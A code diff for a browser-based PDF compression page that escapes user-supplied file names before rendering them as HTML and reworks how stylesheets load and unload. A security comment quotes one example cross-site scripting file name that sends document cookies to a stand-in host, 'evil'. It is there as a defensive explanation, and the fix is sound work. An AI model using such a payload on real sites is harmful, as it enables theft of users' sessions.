@@ -2,8 +2,55 @@
 // Logic below is the original kompres-pdf.html script, verbatim except that
 // every DOM lookup is now scoped to `container` instead of `document`
 // (see map.md checklist: "Bungkus kode setup jadi mount(container) + unmount()").
+//
+// UPDATE (sesi lanjutan, design.md full rewrite): sebelum sesi ini halaman
+// ini gak muat pnm-universal.css ATAU Google Fonts sama sekali (alat
+// client-side murni, gak pernah butuh auth/Supabase) -- style.css-nya
+// sendiri yang isi semua token/reset. Sekarang ikut pola SHARED_LINKS yang
+// sama kayak dashboard/stok/export-gambar (fonts + pnm-universal.css, buat
+// base reset `*{box-sizing:border-box;margin:0;padding:0}` + font Inter
+// yang beneran di-load, bukan cuma nama di fallback list font stack lama).
+// TIDAK pakai pnm-universal.css punya .card/.btn/dst -- lihat style.css
+// buat alasan lengkap kenapa halaman ini tetap pakai nama class dia
+// sendiri, di-scope di bawah `.kp-page`.
 
 import { KOMPRES_PDF_MARKUP } from './markup.js';
+
+// SECURITY FIX: this file renders `File.name` (and names derived from it,
+// e.g. split/merge output names) straight into innerHTML in several spots
+// below. File.name is fully attacker/user-controlled -- a file picked up
+// (drag-drop or file picker) after being renamed on disk to something like
+// `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>.pdf` would
+// execute as real HTML/JS in this page the moment its name is rendered,
+// with this app's own session (Supabase auth is a cookie readable by any
+// JS on the page -- see shared/supabase-client.js's own comment on that).
+// escapeHtml() below is used at every such interpolation point.
+function escapeHtml(s) {
+  return String(s == null ? '' : s)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+const SHARED_LINKS = [
+  { id: 'shared-google-fonts', href: 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400&display=swap' },
+  { id: 'shared-pnm-universal-css', href: '/pnm-universal.css?v=20260813b' },
+];
+
+function loadLink(id, href) {
+  if (document.getElementById(id)) return Promise.resolve();
+  return new Promise((resolve) => {
+    const link = document.createElement('link');
+    link.id = id;
+    link.rel = 'stylesheet';
+    link.href = href;
+    link.onload = () => resolve();
+    link.onerror = () => resolve();
+    document.head.appendChild(link);
+  });
+}
 
 const VENDOR_SCRIPTS = [
   'https://cdnjs.cloudflare.com/ajax/libs/pdf-lib/1.17.1/pdf-lib.min.js',
@@ -30,16 +77,10 @@ function ensureVendorScripts() {
 }
 
 function ensureStyle() {
-  if (document.getElementById('page-kompres-pdf-style')) return Promise.resolve();
-  return new Promise((resolve) => {
-    const link = document.createElement('link');
-    link.id = 'page-kompres-pdf-style';
-    link.rel = 'stylesheet';
-    link.href = new URL('./style.css', import.meta.url).href;
-    link.onload = () => resolve();
-    link.onerror = () => resolve(); // don't block forever if this fails
-    document.head.appendChild(link);
-  });
+  return Promise.all([
+    ...SHARED_LINKS.map(({ id, href }) => loadLink(id, href)),
+    loadLink('page-kompres-pdf-style', new URL('./style.css', import.meta.url).href),
+  ]);
 }
 
 let mountedContainer = null;
@@ -53,7 +94,7 @@ export async function mount(container) {
   // bukan berurutan, biar CSS dan vendor scripts sama-sama jalan paralel
   // — gak nambah waktu tunggu dibanding sebelumnya).
   await Promise.all([ensureStyle(), ensureVendorScripts()]);
-  container.classList.add('wrap'); // style.css's .wrap sets max-width/centering, previously the outer <div class="wrap">
+  container.classList.add('kp-page'); // was 'wrap' -- see style.css's header comment
   container.innerHTML = KOMPRES_PDF_MARKUP;
 
   pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js';
@@ -186,7 +227,7 @@ export async function mount(container) {
       <div class="file-item" data-id="${item.id}">
         ${fileItemIcon(item.status)}
         <div class="file-meta">
-          <div class="file-name">${item.file.name}</div>
+          <div class="file-name">${escapeHtml(item.file.name)}</div>
           <div class="file-status">
             ${badgeFor(item)}
             <span>${item.status === 'done' ? formatBytes(item.originalSize) + ' &rarr; ' + formatBytes(item.newSize) : formatBytes(item.originalSize)}</span>
@@ -611,7 +652,7 @@ export async function mount(container) {
       <div class="file-item" data-id="${item.id}">
         ${fileItemIcon(item.status)}
         <div class="file-meta">
-          <div class="file-name">${item.file.name}</div>
+          <div class="file-name">${escapeHtml(item.file.name)}</div>
           <div class="file-status">
             ${badgeFor(item)}
             <span>${sizeLine}</span>
@@ -915,7 +956,7 @@ export async function mount(container) {
       <div class="file-item">
         <div class="file-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6" stroke-linejoin="round"/></svg></div>
         <div class="file-meta">
-          <div class="file-name">${r.name}</div>
+          <div class="file-name">${escapeHtml(r.name)}</div>
           <div class="file-status"><span>${r.pageCount} halaman · ${formatBytes(r.bytes.byteLength)}</span></div>
         </div>
         <div class="file-actions">
@@ -1024,7 +1065,7 @@ export async function mount(container) {
       <div class="file-item" data-id="${item.id}">
         <div class="file-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><path d="M14 2v6h6" stroke-linejoin="round"/></svg></div>
         <div class="file-meta">
-          <div class="file-name">${idx + 1}. ${item.file.name}</div>
+          <div class="file-name">${idx + 1}. ${escapeHtml(item.file.name)}</div>
           <div class="file-status"><span>${formatBytes(item.file.size)}</span></div>
         </div>
         <div class="file-actions">
@@ -1131,6 +1172,30 @@ export function unmount() {
   // this page) — everything lived inside `container`, so the router's
   // container.innerHTML = '' already tears it all down. Only undo what we
   // set on the container itself:
-  mountedContainer?.classList.remove('wrap');
+  mountedContainer?.classList.remove('kp-page');
   mountedContainer = null;
+
+  // Fix (sesi kedua puluh dua, 28 Agustus 2026): style.css halaman ini
+  // TIDAK PERNAH dilepas di sini sebelumnya — root cause SAMA PERSIS
+  // dengan bug export-gambar yang difix sesi kedelapan belas. style.css
+  // halaman ini (versi LAMA, sebelum sesi lanjutan rewrite ini) punya bare
+  // selector asli (`*`, `html,body`, `body`, `h1`) yang gak pernah bocor
+  // sebelumnya cuma karena gak ada yang pernah nge-remove()-nya — begitu
+  // user pindah dari #kompres-pdf ke modul lain, background/font/padding
+  // tema halaman ini nempel selamanya di <head> dan bocor ke halaman
+  // berikutnya. User konfirmasi ini kejadian beneran di browser waktu itu
+  // (bukan cuma dugaan statis).
+  //
+  // UPDATE (sesi lanjutan): style.css yang BARU (full rewrite) udah NOL
+  // bare selector (semua di bawah `.kp-page`, lihat file itu) -- jadi kelas
+  // bug di atas gak lagi mungkin kejadian dari sumbernya. remove() di sini
+  // tetap dipertahankan sebagai lapis kedua (sama disiplin kayak dashboard/
+  // stok/export-gambar), bukan lagi satu-satunya pertahanan.
+  document.getElementById('page-kompres-pdf-style')?.remove();
+  // shared-pnm-universal-css NO LONGER removed here (jank fix, see the
+  // shared-pnm-universal-css comment in app/shell.html) -- now a permanent
+  // <link>, same treatment shared-google-fonts below already had.
+  // shared-google-fonts SENGAJA TETAP nempel -- pola sama kayak semua
+  // halaman lain yang sudah dimigrasi (harmless, kemungkinan besar dipakai
+  // lagi kalau user pindah ke halaman lain yang share id link yang sama).
 }
